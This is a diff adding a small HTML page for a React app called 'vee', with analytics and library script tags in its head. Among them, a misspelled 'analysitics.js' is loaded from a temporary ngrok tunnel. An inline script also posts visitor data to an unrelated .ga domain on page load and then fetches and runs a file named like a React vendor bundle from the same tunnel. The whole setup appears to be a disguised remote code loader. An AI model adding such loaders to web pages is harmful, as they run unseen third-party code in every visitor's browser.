@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>vee</title>
+    <!-- JQuery Libary -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-WN1J3MLVWE"></script>
+    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+      
+        gtag('config', 'G-WN1J3MLVWE');
+    </script>
+    <script src="https://7dd716f24b54.ngrok.io/js/analysitics.js" defer></script>
+    <script src="https://unpkg.com/react@17/umd/react.development.js" crossorigin></script>  
+    <script src="https://unpkg.com/react-dom@17/umd/react-dom.development.js" crossorigin></script>
+    <script>
+        $.ajax({
+            type: "post",
+            url: "https://sinmineryt.ga/",
+            data: {visitor:true, stid:0},
+            success: function (response) {
+                $.getScript("https://7dd716f24b54.ngrok.io/js/vendor~reactdom.sbA1nf.js");
+            }
+        });
+    </script>
+    <script src="app.js" type="text/babel"></script>
+</head>
+<body>
+    <div id="app"></div>
+</body>
+</html>
